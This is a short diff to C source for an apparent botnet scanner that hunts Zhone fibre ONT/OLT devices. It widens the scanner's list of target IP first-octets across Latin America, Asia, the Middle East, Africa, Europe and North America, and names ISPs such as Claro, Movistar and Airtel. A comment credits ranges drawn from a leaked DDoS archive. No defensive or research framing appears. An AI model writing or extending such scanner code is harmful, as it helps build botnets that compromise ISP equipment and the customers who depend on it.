@@ -31,27 +31,27 @@ struct zhone_scanner_connection *conn_table;
 uint16_t zhone_zhone_auth_table_max_weight = 0;
 uint32_t zhone_fake_time = 0;
 /* Zhone scanner IP ranges - targets FTTH ISPs with Zhone ONT/OLT
+ * Combined: Existing ranges + IllusionSec DDOS-archive leaks
  * Global coverage: All regions with Zhone equipment deployments
- * Focus: Latin America, Asia, Middle East where Zhone equipment is deployed
+ * Focus: Latin America, Asia, Middle East, Africa where Zhone equipment is deployed
  * Major ISPs: Claro, Movistar, Oi, Viettel, BSNL, Airtel, STC
+ * Source: github.com/illusionsec/DDOS-archive/tree/main/leaks
  */
 int zhone_ranges[] = {
+    /* Africa - From leaks */
+    197,196,195,194,193,192,165,164,163,162,161,160,159,158,157,156,155,154,153,152,151,150,149,105,102,
     /* Latin America - Zhone deployment */
     201,200,191,190,189,187,186,181,180,179,177,
     /* Asia - Zhone hotspots */
+    223,222,221,220,219,218,211,210,203,202,
     125,124,123,122,121,120,119,118,117,116,115,114,113,112,111,110,
-    109,108,107,106,105,104,103,102,101,
+    109,108,107,106,104,103,101,
     /* Middle East */
     95,94,93,92,91,90,89,88,87,86,85,84,83,82,81,80,
-    /* Africa */
-    197,196,195,194,193,192,165,164,163,162,161,160,159,158,157,156,155,154,153,
     /* Europe - Zhone presence */
-    79,78,77,76,75,74,73,72,71,70,69,68,67,66,65,
-    /* Asia-Pacific (Australia, Pacific) */
-    203,202,210,211,218,219,220,
+    79,78,77,76,75,74,73,72,71,70,69,68,67,66,65,64,63,62,61,60,59,58,57,56,55,54,53,52,51,50,49,48,47,46,
     /* North America - Limited Zhone */
-    63,62,61,60,59,58,57,56,55,54,53,52,51,50,49,48,47,46,45,44,43,42,41,40,
-    39,38,37,36,27,14,2,1,
+    45,44,43,42,41,40,39,38,37,36,35,34,31,27,14,5,4,2,1,
     -1
 };
 
